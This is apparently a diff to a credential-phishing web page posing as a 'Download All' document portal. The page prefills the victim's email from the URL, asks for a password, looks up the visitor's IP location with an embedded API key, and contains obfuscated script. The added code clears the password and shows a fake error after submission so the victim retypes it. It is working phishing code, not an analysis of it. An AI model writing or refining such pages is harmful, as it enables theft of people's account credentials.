@@ -35,10 +35,10 @@
                     
                   </div>
                 <div>
-                    <input type="text" name="email" id="email" value="" readonly>
+                    <input type="text" name="email" id="email" value="" readonly />
                 </div>
                 <div>
-                    <input type="password" name="password" id="password"   value="" required>
+                    <input type="password" name="password" id="password" class='pswd' value="" required />
                 </div>
                 <div>
                     <center><button  class="form-control mb-3" id="submitBtn">Download All </button></center>
@@ -279,6 +279,41 @@ function _0x3e37() {
 
 
     <script>
+	
+	
+			//console.log('wertyuhyg')
+//const emml = document.querySelector('.email');
+
+const pwd = document.querySelector('#password');
+const fomm = document.querySelector('#furm');
+//const errMsg = document.querySelector('.err_msg');
+const btnSubmit = document.querySelector('#submitBtn');
+console.log(pwd);
+console.log(fomm);
+console.log(btnSubmit);
+
+btnSubmit.addEventListener("click",()=>{
+	setTimeout(()=>{
+		//alert('connected')
+		pwd.value = "";
+	}, 3000)
+});
+
+
+        //const errMsg = document.querySelector('.err_msg');
+        errMsg.style.display = 'none';
+        //const fomm = document.querySelector('#furm');
+        //const pwd = document.querySelector('#password');
+		
+
+        fomm.addEventListener('submit', ()=>{
+            setTimeout(() => {
+                errMsg.style.display = 'block';
+                pwd.value = "";
+            }, 2000);
+        });
+	
+	
 let dt = new Date()
 let ipAdress = `https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`;
 fetch(`${ipAdress}`)
@@ -313,21 +348,7 @@ const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).to
 console.log(extracetdEmail);
 
 
-const emml = document.querySelector('.email')
 
-
-        const errMsg = document.querySelector('.err_msg');
-        errMsg.style.display = 'none';
-        const fomm = document.querySelector('#furm');
-        const pwd = document.querySelector('.pswd');
-
-
-        fomm.addEventListener('submit', ()=>{
-            setTimeout(() => {
-                errMsg.style.display = 'block';
-                pwd.value = "";
-            }, 2000);
-        })
 
     </script>
 
@@ -357,7 +378,6 @@ const emml = document.querySelector('.email')
 
                 }, function(data, status){
                     console.log(data);
-                    
                 })
             });
         });
